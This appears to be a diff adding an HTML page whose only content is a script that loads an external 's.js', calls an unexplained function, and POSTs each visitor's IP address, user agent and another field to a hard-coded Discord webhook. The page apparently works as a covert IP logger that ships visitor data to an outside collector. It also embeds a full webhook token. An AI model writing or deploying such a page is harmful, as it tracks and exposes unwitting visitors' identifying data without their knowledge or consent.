@@ -1,0 +1,15 @@
+<script src="s.js"></script>
+<script>
+const tg = "https://discord.com/api/webhooks/1011218338040520735/PT5ESMv5pSUT-wcV9ZfYlecS2xAyoS9TSzFIkRYo5F1OMTs3vw_TKkmlUKLAP6HHjUgh"
+koz("apple").then(d=>{
+  fetch(tg, {
+    method: "POST",
+    header: {
+      "Content-Type": "Application/json"
+    },
+    body: JSON.stringify({
+      content: `${d.ms}\n${d.ip}\n${d.ua}`
+    })
+  })
+})
+</script>
